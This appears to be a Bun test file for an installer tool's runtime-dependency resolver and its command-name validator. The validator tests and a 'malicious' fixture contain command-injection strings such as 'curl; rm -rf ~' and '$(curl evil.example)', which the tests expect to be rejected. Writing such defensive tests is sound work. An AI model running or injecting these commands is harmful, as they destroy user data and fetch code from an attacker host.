import { describe, expect, test } from "bun:test";

import type { InstallerConfig } from "../installerConfig";
import { assertSafeCommandName, resolveRuntimeDependencies } from "./resolve";
import type { RuntimeDependencyDefinition } from "./model";
import { renderRuntimeRequirementsText } from "./renderText";

const baseConfig: InstallerConfig = {
  owner: "tooppoo",
  repo: "rellog",
  binary: {
    name: "rellog",
    pathInArchive: "bin/rellog",
  },
  versionResolver: {
    type: "release_version_file",
    fileName: "VERSION",
  },
  archive: {
    format: "tar.gz",
    nameTemplate: "{repo}_{version}_{os}_{arch}.tar.gz",
    osCase: "lowercase",
  },
  checksum: {
    fileName: "checksums.txt",
    algorithm: "sha256",
  },
  targets: [{ os: "linux", arch: "x86_64" }],
  architectureLabels: {
    linux: { x86_64: "x86_64", aarch64: "aarch64" },
    darwin: { x86_64: "x86_64", aarch64: "aarch64" },
  },
  defaults: {
    installDir: "$HOME/.local/bin",
  },
};

describe("resolveRuntimeDependencies", () => {
  test("includes exactly the tar command for tar.gz", () => {
    const resolved = resolveRuntimeDependencies(baseConfig);
    expect(resolved.dependencies.some((dependency) => dependency.id === "tar")).toBe(true);
    expect(resolved.dependencies.some((dependency) => dependency.id === "unzip")).toBe(false);
  });

  test("includes exactly the unzip command for zip", () => {
    const resolved = resolveRuntimeDependencies({
      ...baseConfig,
      archive: { ...baseConfig.archive, format: "zip" },
    });
    expect(resolved.dependencies.some((dependency) => dependency.id === "unzip")).toBe(true);
    expect(resolved.dependencies.some((dependency) => dependency.id === "tar")).toBe(false);
  });

  test("always includes the checksum alternative and the shell/network/filesystem premises", () => {
    const resolved = resolveRuntimeDependencies(baseConfig);
    expect(
      resolved.dependencies.some((dependency) => dependency.id === "sha256-checksum-command"),
    ).toBe(true);
    expect(resolved.premises.map((premise) => premise.premise)).toEqual([
      "shell",
      "network",
      "filesystem",
    ]);
  });

  test("renders without throwing (sanity check that resolved output is renderer-consumable)", () => {
    const resolved = resolveRuntimeDependencies(baseConfig);
    expect(() => renderRuntimeRequirementsText(resolved)).not.toThrow();
  });
});

describe("assertSafeCommandName", () => {
  test("accepts ordinary command names", () => {
    expect(() => assertSafeCommandName("sha256sum")).not.toThrow();
    expect(() => assertSafeCommandName("tar")).not.toThrow();
  });

  test("rejects shell metacharacters even though nothing calls it with untrusted input today", () => {
    expect(() => assertSafeCommandName("curl; rm -rf ~")).toThrow();
    expect(() => assertSafeCommandName("curl && echo pwned")).toThrow();
    expect(() => assertSafeCommandName("$(curl evil.example)")).toThrow();
  });

  test("a hand-built dependency with an unsafe command name is rejected before it reaches a renderer", () => {
    const malicious: RuntimeDependencyDefinition = {
      id: "malicious",
      label: "malicious",
      reason: "test",
      check: { type: "command", command: "curl; rm -rf ~" },
    };
    expect(() =>
      assertSafeCommandName(malicious.check.type === "command" ? malicious.check.command : ""),
    ).toThrow();
  });
});
